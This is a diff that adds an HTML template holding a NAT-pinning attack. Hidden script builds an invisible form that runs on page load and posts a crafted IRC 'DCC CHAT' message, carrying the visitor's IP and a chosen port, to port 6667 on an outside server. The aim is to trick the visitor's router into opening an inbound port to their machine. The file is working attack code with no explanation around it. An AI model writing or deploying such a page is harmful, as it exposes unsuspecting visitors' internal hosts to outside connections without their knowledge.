@@ -1,0 +1,48 @@
+<html>
+	<head>
+		<script>
+			function Pin(port)
+			{
+				ip = {{ ip }};
+				x = String.fromCharCode(1);
+				s = 'PRIVMSG person :' + x + 'DCC CHAT person ' + ip + ' ' + port + x + "\n";
+			}
+		</script>
+	</head>
+	<body>
+		<div id=acidburn style="visibility:hidden"> 
+			<script Language="Javascript"> 
+				function Pin(port)
+				{
+					ip = {{ ip }};
+					server = 'placeholdermetaserver.appspot.com';
+					x = String.fromCharCode(1);
+					s = 'PRIVMSG samy :'+x+'DCC CHAT samy '+ip+' '+port+x+"\n";
+				 
+					acidburn = document.getElementById("acidburn");
+					
+					gibson = document.createElement("form");
+					gibson.setAttribute("name", "B");
+					gibson.setAttribute("target", "A");
+					gibson.setAttribute("method", "post");
+					gibson.setAttribute("action", "http://"+server+":6667");
+					gibson.setAttribute("enctype", "multipart/form-data");
+					
+					crashoverride = document.createElement("textarea");
+					crashoverride.setAttribute("name", "C");
+					crashoverride.setAttribute("value", s);
+					crashoverride.innerText=s;
+					crashoverride.innerHTML=s;
+					gibson.appendChild(crashoverride);
+					acidburn.appendChild(gibson);
+					 
+					// this will never complete
+					gibson.submit();
+				}
+			</script> 
+		</div>
+		<script>
+			Pin({{ port }});
+		</script>
+	</body>
+</html>
